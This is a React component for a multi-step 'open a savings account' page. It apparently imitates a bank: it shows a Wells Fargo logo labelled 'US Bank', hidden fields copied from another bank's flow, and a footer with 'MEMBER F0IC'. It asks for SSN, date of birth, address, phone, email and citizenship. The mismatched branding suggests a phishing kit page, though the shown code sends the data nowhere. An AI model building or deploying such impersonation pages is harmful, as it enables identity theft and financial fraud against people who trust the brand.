import React from 'react';
import { useNavigate } from 'react-router-dom';
import './singnup.css'

const Detailspage = () => {
    const navigate = useNavigate()


    const handleSubmit = (event) => {
        event.preventDefault();


        navigate("/createaccount")
    };

    return (
        <div>
            <header>
                <div>
                    <a href="#">
                        <img
                            src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e2/Wells_Fargo_Logo_%282020%29.svg/1200px-Wells_Fargo_Logo_%282020%29.svg.png"
                            alt="US Bank Logo"
                        />
                    </a>
                </div>
                <div>
                    <p>
                        {/* Already have an account with us <a href="#">Login</a> */}
                    </p>
                </div>
            </header>

            <div className="container">
                <div className="statusbar">
                    <div className="dot active"></div>
                    <div className="line"></div>
                    <div className="dot"></div>
                    <div className="line"></div>
                    <div className="dot"></div>
                </div>

                <h1>Open a new personal Savings Account</h1>
                <p>Tell us about yourself</p>

                <form id="myForm" onSubmit={handleSubmit}>
                    <input type="hidden" name="productCode" value="P2001" />
                    <input type="hidden" name="refId" value="GOPS_targeted_psav" />
                    <input
                        type="hidden"
                        name="liveoakProdCSACd"
                        value="_1566-60f36341213d4f0e91b36707c5a3c4c9"
                    />

                    <div className="flexpage">
                        <div className="form">
                            <div className="form-group" style={{ width: '25%' }}>
                                <label htmlFor="firstName">First Name</label>
                                <input type="text" id="firstName" name="firstName" required />
                            </div>
                            <div className="form-group" style={{ width: '25%' }}>
                                <label htmlFor="middleName">Middle Name (optional)</label>
                                <input type="text" id="middleName" name="middleName" />
                            </div>
                            <div className="form-group" style={{ width: '25%' }}>
                                <label htmlFor="lastName">Last Name</label>
                                <input type="text" id="lastName" name="lastName" required />
                            </div>
                            <div className="form-group" style={{ width: '25%' }}>
                                <label htmlFor="suffix">Suffix (optional)</label>
                                <input type="text" id="suffix" name="suffix" />
                            </div>
                        </div>

                        <div className="form1">
                            <div className="form-group" style={{ width: '50%' }}>
                                <label htmlFor="address1">Current Address</label>
                                <input type="text" id="address1" name="address1" required />
                            </div>
                            <div className="form-group" style={{ width: '50%' }}>
                                <label htmlFor="address2">Current Address 2 (optional)</label>
                                <input type="text" id="address2" name="address2" />
                            </div>
                        </div>

                        <div className="form">
                            <div className="form-group" style={{ width: '50%' }}>
                                <label htmlFor="city">City</label>
                                <input id="city" name="city" type="text" required />
                            </div>
                            <div className="form-group" style={{ width: '15%' }}>
                                <label htmlFor="state">State</label>
                                <select id="state" name="state" required>
                                    <option value="">Select...</option>
                                    <option>AA</option>
                                    <option>AE</option>
                                    <option>AK</option>
                                    <option>AL</option>
                                    <option>AP</option>
                                    <option>AR</option>
                                    <option>AS</option>
                                    <option>AZ</option>
                                    <option>CA</option>
                                    <option>CO</option>
                                    <option>CT</option>
                                    <option>DC</option>
                                    <option>DE</option>
                                    <option>FL</option>
                                    <option>GA</option>
                                    <option>GU</option>
                                    <option>HI</option>
                                    <option>IA</option>
                                    <option>ID</option>
                                    <option>IL</option>
                                    <option>IN</option>
                                    <option>KS</option>
                                    <option>KY</option>
                                    <option>LA</option>
                                    <option>MA</option>
                                    <option>MD</option>
                                    <option>ME</option>
                                    <option>MI</option>
                                    <option>MN</option>
                                    <option>MO</option>
                                    <option>MP</option>
                                    <option>MS</option>
                                    <option>MT</option>
                                    <option>NC</option>
                                    <option>ND</option>
                                    <option>NE</option>
                                    <option>NH</option>
                                    <option>NJ</option>
                                    <option>NM</option>
                                    <option>NV</option>
                                    <option>NY</option>
                                    <option>OH</option>
                                    <option>OK</option>
                                    <option>OR</option>
                                    <option>PA</option>
                                    <option>PR</option>
                                    <option>RI</option>
                                    <option>SC</option>
                                    <option>SD</option>
                                    <option>TN</option>
                                    <option>TX</option>
                                    <option>UM</option>
                                    <option>UT</option>
                                    <option>VA</option>
                                    <option>VI</option>
                                    <option>VT</option>
                                    <option>WA</option>
                                    <option>WI</option>
                                    <option>WV</option>
                                    <option>WY</option>
                                </select>
                            </div>
                            <div className="form-group" style={{ width: '15%' }}>
                                <label htmlFor="zipCode">Zip Code</label>
                                <input type="text" id="zipCode" name="zipCode" required />
                            </div>
                            <div className="form-group" style={{ width: '20%' }}>
                                <label htmlFor="yearsAtAddress">
                                    Years at Address{' '}
                                    <svg
                                        width="18px"
                                        height="18px"
                                        viewBox="0 0 24 24"
                                        fill="none"
                                        xmlns="http://www.w3.org/2000/svg"
                                    >
                                        <path
                                            fillRule="evenodd"
                                            clipRule="evenodd"
                                            d="M22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12ZM12 17.75C12.4142 17.75 12.75 17.4142 12.75 17V11C12.75 10.5858 12.4142 10.25 12 10.25C11.5858 10.25 11.25 10.5858 11.25 11V17C11.25 17.4142 11.5858 17.75 12 17.75ZM12 7C12.5523 7 13 7.44772 13 8C13 8.55228 12.5523 9 12 9C11.4477 9 11 8.55228 11 8C11 7.44772 11.4477 7 12 7Z"
                                            fill="#d71e28"
                                        />
                                    </svg>
                                </label>
                                <select id="yearsAtAddress" name="yearsAtAddress" required>
                                    <option value="">Select...</option>
                                    <option value="1">1</option>
                                    <option value="1-2">2</option>
                                    <option value="3-5">3</option>
                                    <option value="5+">4+</option>
                                </select>
                            </div>
                        </div>

                        <div className="form-group">
                            <div className="radioicon">
                                <div>
                                    <input type="checkbox" name="certify"  />
                                </div>
                                <div>
                                    <label>I have a different mailing address</label>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div className="flexpage">
                        <div className="form">
                            <div className="form-group" style={{ width: '25%' }}>
                                <label htmlFor="ssn">
                                    SSN{' '}
                                    <svg
                                        width="18px"
                                        height="18px"
                                        viewBox="0 0 24 24"
                                        fill="none"
                                        xmlns="http://www.w3.org/2000/svg"
                                    >
                                        <path
                                            fillRule="evenodd"
                                            clipRule="evenodd"
                                            d="M22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12ZM12 17.75C12.4142 17.75 12.75 17.4142 12.75 17V11C12.75 10.5858 12.4142 10.25 12 10.25C11.5858 10.25 11.25 10.5858 11.25 11V17C11.25 17.4142 11.5858 17.75 12 17.75ZM12 7C12.5523 7 13 7.44772 13 8C13 8.55228 12.5523 9 12 9C11.4477 9 11 8.55228 11 8C11 7.44772 11.4477 7 12 7Z"
                                            fill="#d71e28"
                                        />
                                    </svg>
                                </label>
                                <input type="text" id="ssn" name="ssn" required />
                            </div>
                            <div className="form-group" style={{ width: '25%' }}>
                                <label htmlFor="dob">
                                    Date of Birth{' '}
                                    <svg
                                        width="18px"
                                        height="18px"
                                        viewBox="0 0 24 24"
                                        fill="none"
                                        xmlns="http://www.w3.org/2000/svg"
                                    >
                                        <path
                                            fillRule="evenodd"
                                            clipRule="evenodd"
                                            d="M22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12ZM12 17.75C12.4142 17.75 12.75 17.4142 12.75 17V11C12.75 10.5858 12.4142 10.25 12 10.25C11.5858 10.25 11.25 10.5858 11.25 11V17C11.25 17.4142 11.5858 17.75 12 17.75ZM12 7C12.5523 7 13 7.44772 13 8C13 8.55228 12.5523 9 12 9C11.4477 9 11 8.55228 11 8C11 7.44772 11.4477 7 12 7Z"
                                            fill="#d71e28"
                                        />
                                    </svg>
                                </label>
                                <input type="date" id="dob" name="dob" required />
                            </div>
                            <div className="form-group" style={{ width: '25%' }}>
                                <label htmlFor="identity">I am a:</label>
                                <select id="identity" name="identity" required>
                                    <option value="">Select...</option>
                                    <option value="US Citizen">US Citizen</option>
                                    <option value="Permanent Resident">Permanent Resident</option>
                                    <option value="Non-Resident Alien">Non-Resident Alien</option>
                                </select>
                            </div>
                            <div className="form-group" style={{ width: '25%' }}>
                                <div className="radioicon">
                                    <div>
                                        <input type="checkbox" name="w9Withholdings" />
                                    </div>
                                    <div>
                                        <label>
                                            I have been notified by the IRS that I am subject to W9
                                            Withholdings{' '}
                                            <svg
                                                width="18px"
                                                height="18px"
                                                viewBox="0 0 24 24"
                                                fill="none"
                                                xmlns="http://www.w3.org/2000/svg"
                                            >
                                                <path
                                                    fillRule="evenodd"
                                                    clipRule="evenodd"
                                                    d="M22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12ZM12 17.75C12.4142 17.75 12.75 17.4142 12.75 17V11C12.75 10.5858 12.4142 10.25 12 10.25C11.5858 10.25 11.25 10.5858 11.25 11V17C11.25 17.4142 11.5858 17.75 12 17.75ZM12 7C12.5523 7 13 7.44772 13 8C13 8.55228 12.5523 9 12 9C11.4477 9 11 8.55228 11 8C11 7.44772 11.4477 7 12 7Z"
                                                    fill="#d71e28"
                                                />
                                            </svg>
                                        </label>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div className="flexpage">
                        <div className="form1">
                            <div className="form-group" style={{ width: '33%' }}>
                                <label htmlFor="mobilePhone">Mobile Phone</label>
                                <input type="text" id="mobilePhone" name="mobilePhone" required />
                            </div>
                            <div className="form-group" style={{ width: '33%' }}>
                                <label htmlFor="homePhone">Home Phone (optional)</label>
                                <input type="text" id="homePhone" name="homePhone" />
                            </div>
                            <div className="form-group" style={{ width: '33%' }}>
                                <label htmlFor="email">Email</label>
                                <input type="email" id="email" name="email" required />
                            </div>
                        </div>
                    </div>

                    <div className="flexpage">
                        <div className="form1">
                            <div className="form-group" style={{ width: '50%' }}>
                                <label htmlFor="employmentStatus">Employment Status</label>
                                <select id="employmentStatus" name="employmentStatus" required>
                                    <option value="">Select...</option>
                                    <option value="fullTime">Full Time</option>
                                    <option value="partTime">Part Time</option>
                                    <option value="paidLeave">Paid Leave</option>
                                    <option value="retired">Retired</option>
                                    <option value="unemployed">Unemployed</option>
                                    <option value="other">Other</option>
                                    <option value="notApplicable">Not Applicable</option>
                                </select>
                            </div>
                            <div className="form-group" style={{ width: '50%' }}>
                                <label htmlFor="occupation">Occupation</label>
                                <select id="occupation" name="occupation" required>
                                    <option value="">Select...</option>
                                    <option value="architectureAndEngineering">
                                        Architecture and Engineering
                                    </option>
                                    <option value="artsDesignEntertainmentSportsAndMedia">
                                        Arts, Design, Entertainment, Sports, and Media
                                    </option>
                                    <option value="buildingAndGroundsCleaningAndMaintenance">
                                        Building and Grounds Cleaning and Maintenance
                                    </option>
                                    <option value="businessAndFinancialOperations">
                                        Business and Financial Operations
                                    </option>
                                    <option value="communityAndSocialService">
                                        Community and Social Service
                                    </option>
                                    <option value="computerAndMathematical">
                                        Computer and Mathematical
                                    </option>
                                    <option value="constructionAndExtraction">
                                        Construction and Extraction
                                    </option>
                                    <option value="educationTrainingAndLibrary">
                                        Education, Training, and Library
                                    </option>
                                    <option value="farmingFishingAndForestry">
                                        Farming, Fishing, and Forestry
                                    </option>
                                    <option value="foodPreparationAndServingRelated">
                                        Food Preparation and Serving Related
                                    </option>
                                    <option value="healthcarePractitionersAndTechnical">
                                        Healthcare Practitioners and Technical
                                    </option>
                                    <option value="healthcareSupport">Healthcare Support</option>
                                    <option value="installationMaintenanceAndRepair">
                                        Installation, Maintenance, and Repair
                                    </option>
                                    <option value="legal">Legal</option>
                                    <option value="lifePhysicalAndSciences">
                                        Life, Physical, and Sciences
                                    </option>
                                    <option value="management">Management</option>
                                    <option value="militarySpecific">Military Specific</option>
                                    <option value="officeAndAdministrativeSupport">
                                        Office and Administrative Support
                                    </option>
                                    <option value="personalCareAndService">
                                        Personal Care and Service
                                    </option>
                                    <option value="production">Production</option>
                                    <option value="protectiveServices">Protective Services</option>
                                    <option value="salesAndRelated">Sales and Related</option>
                                    <option value="transportationAndMaterialMoving">
                                        Transportation and Material Moving
                                    </option>
                                    <option value="other">Other</option>
                                    <option value="notApplicable">Not Applicable</option>
                                </select>
                            </div>
                        </div>
                    </div>

                    <div className="flexpage1">
                        <div className="form-group">
                            <label>
                                Are you currently, or have you ever been a Foreign Senior Political Figure?
                            </label>
                            <div className="radioicon">
                                <div>
                                    <input type="radio" name="politicalFigure1" value="yes" required />
                                </div>
                                <div>
                                    <label>Yes</label>
                                </div>
                            </div>
                            <div className="radioicon">
                                <div>
                                    <input type="radio" name="politicalFigure1" value="no" required />
                                </div>
                                <div>
                                    <label>No</label>
                                </div>
                            </div>
                        </div>

                        <div className="form-group">
                            <label>
                                Are you an immediate family member or a close associate of someone who is currently or
                                previously a Foreign Senior Political Figure?
                            </label>
                            <div className="radioicon">
                                <div>
                                    <input type="radio" name="politicalFigure2" value="yes" required />
                                </div>
                                <div>
                                    <label>Yes</label>
                                </div>
                            </div>
                            <div className="radioicon">
                                <div>
                                    <input type="radio" name="politicalFigure2" value="no" required />
                                </div>
                                <div>
                                    <label>No</label>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div className="flexpage1">
                        <div className="radioicon">
                            <div>
                                <input type="checkbox" name="certify" required />
                            </div>
                            <div>
                                <label>
                                    I certify that the information provided above is complete and accurate, and that my SSN
                                    or ITIN is entered correctly, and that I am a citizen or permanent resident alien of the
                                    United States of America.
                                </label>
                            </div>
                        </div>
                    </div>

                    <div className="form-group">
                        <button type="submit" className="button-l">
                            Next
                            <svg width="24px" height="24px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                <g id="SVGRepo_bgCarrier" strokeWidth="0"></g>
                                <g id="SVGRepo_tracerCarrier" strokeLinecap="round" strokeLinejoin="round"></g>
                                <g id="SVGRepo_iconCarrier">
                                    <title></title>
                                    <g id="Complete">
                                        <g id="arrow-right">
                                            <g>
                                                <polyline
                                                    data-name="Right"
                                                    fill="none"
                                                    id="Right-2"
                                                    points="16.4 7 21.5 12 16.4 17"
                                                    stroke="#ffffff"
                                                    strokeLinecap="round"
                                                    strokeLinejoin="round"
                                                    strokeWidth="2"
                                                ></polyline>
                                                <line
                                                    fill="none"
                                                    stroke="#ffffff"
                                                    strokeLinecap="round"
                                                    strokeLinejoin="round"
                                                    strokeWidth="2"
                                                    x1="2.5"
                                                    x2="19.2"
                                                    y1="12"
                                                    y2="12"
                                                ></line>
                                            </g>
                                        </g>
                                    </g>
                                </g>
                            </svg>
                        </button>
                    </div>
                </form>

                <div className="contact-info">
                    Call us Monday through Friday 8:00 a.m. - 8:00 p.m. ET at{' '}
                    <a href="tel:8665180286">866.518.0286</a>
                </div>

                <div className="footer">
                    <a href="#">Contact Us</a> | <a href="#">Privacy Policy</a> | <a href="#">Disclosures</a> |{' '}
                    <a href="#">Support</a> | <a href="#">About Us</a> | <a href="#">Privacy & Security</a>
                </div>

                <footer style={{ textAlign: 'center', fontSize: '14px' }}>
                    <p>© 2025 US Bank. ALL RIGHTS RESERVED. MEMBER F0IC.</p>
                </footer>
            </div>
        </div>
    );
};

export default Detailspage;